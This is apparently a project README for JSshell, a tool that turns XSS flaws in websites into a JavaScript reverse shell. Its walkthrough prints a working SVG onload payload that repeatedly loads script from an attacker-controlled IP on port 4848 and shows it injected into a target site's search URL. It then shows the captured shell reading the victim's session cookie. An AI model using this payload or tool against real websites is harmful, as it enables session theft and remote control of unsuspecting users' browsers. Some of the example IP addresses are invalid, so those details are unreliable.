# JSshell
JSshell - a JavaScript reverse shell. This using for exploit XSS remotely, help to find blind XSS, ...

This tool works for both Unix and Windows operating system and it can running with both Python 2 and Python 3. This is 
a big update of JShell - a tool to get a JavaScript shell with XSS by s0med3v. JSshell also doesn't require Netcat (different from other javascript shells).

# Usage
#### Generate JS reverse shell payload:  `-g`
#### Set the local port number for listening and generating payload (By default, it will be set to 4848):  `-p`
#### Set the local source address for generating payload (JSshell will detect your IP address by deault):  `-s`
#### Set timeout for shell connection (if the user exit page, the shell will be pause, and if your set the timeout, after a while without response, the shell will automatically close):  `-w`
#### Execute a command when got the shell:  `-c`

#### Example usages:
- `js.py`
- `js.py -g`
- `js.py -p 1234`
- `js.py -s 48.586.1.23 -g`
- `js.py -c "alert(document.cookie)" -w 10`

#### An example for running JSshell:
This is an example for step-by-step to exploit remote XSS using JSshell.

First we will generate a reverse JS shell payload and set the shell timeout is 20 seconds:

```
# whoami
root
# ls
README.md   js.py
# python3 js.py -g -w 20
    __
  |(_  _ |_  _  |  |
\_|__)_> | |(/_ |  |
                      v1.0

Payload:
<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//171.224.181.106:4848"},1248)>

Listening on [any] 4848 for incoming JS shell ...
```

Now paste this payload to the website (or URL) that vulnerable to XSS:

`https://vulnwebs1te.com/b/search?q=<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//171.224.181.106:4848"},1248)>`

Access the page and now we will see that we have got the reverse JS shell:

```
    __
  |(_  _ |_  _  |  |
\_|__)_> | |(/_ |  |
                      v1.0

Payload:
<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//171.224.181.106:4848"},1248)>

Listening on [any] 4848 for incoming JS shell ...
Got JS shell from [75.433.24.128] port 39154 to DESKTOP-1GSL2O2 4848
$ established
$ the
$ shell
$
$
$ help
JSshell using javascript code as shell commands. Also supports some commands:
help                  This help
exit, quit            Exit the JS shell
$
```
Now let's execute some commands:

```
$ var test = 'hacked'
$ alert(hacked)

```
And the browser got an alert:  `hacked`

```
$ prompt(document.cookie)

```
And the browser print the user cookies:  `JSESSION=3bda8...`

```
$ exit
# whoami
root
# pwd
/home/shelld3v
```

And we quited!


# Author
This created by shelld3v, hacking at HackOne and Bugcrowd with a secret account! This tool is inspired by JShell (s0med3v), using the BruteLogic payload. JSshell 2.0 will has some new features that include:

- More payloads for `<img>`, `<script>`, ...
- Some shortcut commands: print the current session, domain, endpoint, ...
- Better GUI  
...
